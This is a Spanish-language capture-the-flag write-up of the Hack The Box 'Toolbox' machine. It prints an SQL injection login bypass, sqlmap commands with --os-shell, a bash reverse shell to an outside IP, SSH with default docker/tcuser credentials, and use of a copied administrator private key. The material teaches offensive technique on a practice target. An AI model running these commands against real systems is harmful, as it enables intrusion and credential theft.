#by d4l1

<p align="center"><img src=""></p>

<h1 align="center">Toolbox</h1>

# ÍNDICE

# INICIO

Toolbok es una máquina windows fácil con un docker instalado, Usado como contenedor de host de linux, este servidor tiene un sitio y una vulnerabilidad de SQL. Esto hace que el mismo contenedor. Tenga unas contraseñas predefinidis y acedamos con una shell al hosts.

Como siempre el test de conectividad

![image](https://github.com/D4l1-web/HTB/assets/79869523/50068644-51e5-40d5-b714-c84b7090a31a)

Escaneo de puertos

![image](https://github.com/D4l1-web/HTB/assets/79869523/866d02f5-c2d2-4396-b3a9-fbaccbadcb19)

Nos encontramos con un ftp con anonymous un ssh y varios puertos importantes como un rpc un apache, un smb, un wrm o un netbios.

Es una máquina windows pero tiene un apache en un servidor debian jaja.

Esto indica virtualización.

Vemos un ftp con el modo pasivo a ver si nos podemos conectar con anonymous/anonymous

![image](https://github.com/D4l1-web/HTB/assets/79869523/f807d829-465d-4b70-b77a-0983320de6b6)

Nos encontramos con un archivo exe visible seguramente funcionando en el servidor docker

si nos vamos al puerto 443 https encontramos una página.

Si exploramos la página encontraremos el certificado ssl con un vhost

![image](https://github.com/D4l1-web/HTB/assets/79869523/0755ffa8-f27b-46b3-b615-2fdb63d96611)

la añadimos
```
echo "ip admin.megalogistic.com" | sudo tee -a /etc/hosts
```
Nos encontramos con esto 
![image](https://github.com/D4l1-web/HTB/assets/79869523/01694c46-705e-4acb-bdc5-8c5d2828a3d7)

Vemos un login visible, y podemos intentar sql injeccion básicos como un admin' or 1=1 -- o alguno a sí. ESTAMOS DENTRO JAJ

![image](https://github.com/D4l1-web/HTB/assets/79869523/b16f57e2-939a-4ff2-a2eb-b50759bd9e0d)

Esto nos ha dado acceso al dashboard del administrador

Primero famos a coger una request de esta misma y la pasaremos por sqlmap para enumerar la base de datos y si encontramos algo.

![image](https://github.com/D4l1-web/HTB/assets/79869523/1efc874c-917d-4cad-a02b-88108ac76323)

Nos cogemos la consulta y nos copiamos el fichero


![image](https://github.com/D4l1-web/HTB/assets/79869523/53ea6d4f-cdcd-43b4-9673-130ea2ddc793)
![image](https://github.com/D4l1-web/HTB/assets/79869523/2da66f7b-6176-4b07-ab82-3bbb33491140)

```
sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ss
```

Nos indica que tenemos una injeccion identificada.

![image](https://github.com/D4l1-web/HTB/assets/79869523/7adbb25b-a1a0-47f7-a9b5-7c66d8084b11)

```
sqlmap -r toolbox.req --risk=3 --level=3 --batch --force-ssl --os-shell
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/3d7db877-9258-4559-ac23-c83fa9d00015)

Ahora podemos ejecutar una reverse bash para ganar acceso al servidor.

```
bash -c 'bash -i >& /dev/tcp/10.10.14.22/4444 0>&1'
```

![image](https://github.com/D4l1-web/HTB/assets/79869523/25077692-b53e-47bd-b1e8-c078701fcd60)

![image](https://github.com/D4l1-web/HTB/assets/79869523/2f4a106c-9e2b-44bd-a4e9-46e76543d5b2)


## ESCALADA DE PRIVILEGIOS

La herramienta toolbox usa VM para contener. Estos archivos son distribuciones de vitualbox y las crdenciales normalmente predefinidas son docker / tcuser. Vamos a ver nuestra ip

![image](https://github.com/D4l1-web/HTB/assets/79869523/b2e4c6df-2def-4ddc-b42e-91b85721d9cf)

Vemosq ue nuestra ip es la 0.2 y que hay un host en la 0.1 vamos a intentar hacer un ssh importanto una shell buena
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
ssh docker@172.17.0.1
```

Estamos dentro

![image](https://github.com/D4l1-web/HTB/assets/79869523/2af11a90-56d5-45fb-a0c7-fb9391aebdf1)

Ahora dentro vamos a irnos a los archivos definidos y nos vamos a C:\Users y nos vamos al archivo oculto .ssh

![image](https://github.com/D4l1-web/HTB/assets/79869523/662be5e1-7098-42b8-b535-e8fd9f80a99a)

![image](https://github.com/D4l1-web/HTB/assets/79869523/17e5858f-48fc-42f0-9d32-2fd9878a82d9)

![image](https://github.com/D4l1-web/HTB/assets/79869523/6d9b3bf3-0cea-46bf-84bf-e1b401fa3b8d)

Para poder entrar con la id_rsa debera tener los permisos
```
chmod 600 id_rsa
ssh administrator@ip -i id_rsa
```
![image](https://github.com/D4l1-web/HTB/assets/79869523/46e4864e-b024-486d-9653-b87b50ccdc12)

![image](https://github.com/D4l1-web/HTB/assets/79869523/fbdc291e-37f4-46ab-8b7f-e7ed4f5ec85d)

GG
